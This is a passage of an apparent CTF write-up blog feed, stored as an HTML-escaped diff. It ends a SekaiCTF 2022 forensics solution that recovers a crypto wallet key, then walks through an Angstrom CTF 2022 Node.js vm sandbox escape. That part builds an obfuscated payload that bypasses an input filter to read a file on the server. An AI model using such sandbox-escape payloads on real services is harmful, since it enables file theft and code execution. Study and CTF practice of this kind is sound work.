+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;bip39list.txt&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;r&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x26F4036773F33FD1BC4E55616472CD7F65086B670B2DD5B84BB4D16F02730E734F72E500&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zfill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;mnemonic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;mnemonic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mnemonic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 test2.py
+evidence leopard solution layer legend danger orient project silver flower wrong path stove throw fortune report nuclear old target exact broom hawk toss paper
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We’ve got the mnemonics! Let’s head to &lt;a href=&quot;https://iancoleman.io/bip39/&quot;&gt;https://iancoleman.io/bip39/&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2022-10-04-SekaiCTF2022-Symbolic-Needs-1-2/bip39-conf.png&quot; alt=&quot;bip39-conf.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The first derived address (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xACa5872e497F0Cc626d1E9bA28bAEC149315266e&lt;/code&gt;) matches the description. We need the private key:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2022-10-04-SekaiCTF2022-Symbolic-Needs-1-2/bip39-key.png&quot; alt=&quot;bip39-key.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SEKAICTF{0x81c458e9fae445de18385a3379513acc8e191e4c2667c85aa0a52a32ec4e6d55}&lt;/code&gt;&lt;/p&gt;
+
+</description>
+                <pubDate>Mon, 03 Oct 2022 00:00:00 +0000</pubDate>
+                <link>https://stdor7314.github.io/2022/10/03/SekaiCTF2022-Symbolic-Needs-1-2.html</link>
+                <guid isPermaLink="true">https://stdor7314.github.io/2022/10/03/SekaiCTF2022-Symbolic-Needs-1-2.html</guid>
+                
+                <category>ctf</category>
+                
+                <category>ctf-writeups</category>
+                
+                <category>ctf-forensics</category>
+                
+                <category>memory-forensics</category>
+                
+                <category>volatility</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>Angstrom CTF 2022 : CaaSio PSE</title>
+                <description>&lt;p&gt;A js jail escape challenge. I learnt quite a few weird js techniques when solving this question.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;the-challenge&quot;&gt;The challenge&lt;/h2&gt;
+
+&lt;p&gt;The server runs a listener with the following js file:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;#!/usr/local/bin/node
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// flag in ./flag.txt&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;readline&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;readline&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;readline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+
+&lt;span class=&quot;kr&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;question&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Welcome to CaaSio: Please Stop Edition! Enter your calculation:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kr&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;215&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+            &lt;span class=&quot;sr&quot;&gt;/^&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;[\x&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;20-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;7e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+$/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\[\]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;;`&apos;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;_&amp;lt;&amp;gt;?:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;includes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;runInNewContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{});&lt;/span&gt;
+                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Result:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                    &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;See, isn&apos;t the calculator so much nicer when you&apos;re not trying to hack it?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;your tried&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Third time really is the charm! I&apos;ve finally created an unhackable system!&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basically, the server accepts a js string and eval it in a separate V8 context. Our goal is to read ./flag.txt. There are some constraints for our payload;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;length &amp;lt; 215&lt;/li&gt;
+  &lt;li&gt;All characters in range &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[0x20, 0x7e]&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Doesn’t contain any characters from the set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.[]{}\s;`&apos;&quot;\_&amp;lt;&amp;gt;?:&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Doesn’t have the keyword ‘import’&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;idea&quot;&gt;Idea&lt;/h2&gt;
+
+&lt;p&gt;We are running code in an empty context, and that means we cannot use functions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import&lt;/code&gt;. But there’s still a way to bypass that: by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{}.constructor.constructor&lt;/code&gt;. It is a function constructor that returns a function from a string. Turns out that the function created in this way can access all the global variables and the modules we need for disk access.&lt;/p&gt;
+
+&lt;p&gt;Constraint 3 was hard to bypass at first glance, but there’s some workarounds. With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt; banned, we can still access object members using the keyword &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with&lt;/code&gt; (&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with&quot;&gt;docs&lt;/a&gt;). For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;String.fromCharCode(0x41)&lt;/code&gt; can be rewritten as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with(String) fromCharCode(0x41)&lt;/code&gt;. Also, we can bypass constraint 3 by using base64 encoding (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atob/btoa&lt;/code&gt;) and uriencode (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escape/unescape&lt;/code&gt;). But the problem is, using fromCharCode to generate string makes the payload too long – is there a better way?&lt;/p&gt;
+
+&lt;p&gt;Maybe you’ve noticed that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; was missing in constraint 3 by now, and that’s right! We can  get a string from a Regex literal. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/myregexp/.source&lt;/code&gt; gives you the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;myregexp&apos;&lt;/code&gt;, and we can bypass the dot using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with(/myregexp/) atob(source)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;With that in mind let’s smuggle some encoded payload in our regex. Our payload to read file is&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mainModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readFileSync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flag.txt&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;, and to bypass the constraints, we’ll encode it with base64. So the payload becomes&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;atob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoImZzIikucmVhZEZpbGVTeW5jKCJmbGFnLnR4dCIp&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we need to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{}.constructor.constructor&lt;/code&gt; thing:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;return this&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;atob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoImZzIikucmVhZEZpbGVTeW5jKCJmbGFnLnR4dCIp&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, we uriencode the whole thing with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escape&lt;/code&gt;, and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(unescape())&lt;/code&gt; on that whole payload. We’ll use the regex trick here:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/a=%22constructor%22%3Bwith%28this%5Ba%5D%5Ba%5D%28%22return%20this%22%29%28%29%29eval%28atob%28%22cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoImZzIikucmVhZEZpbGVTeW5jKCJmbGFnLnR4dCIp%22%29%29/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And that’ll give us:&lt;/p&gt;
+
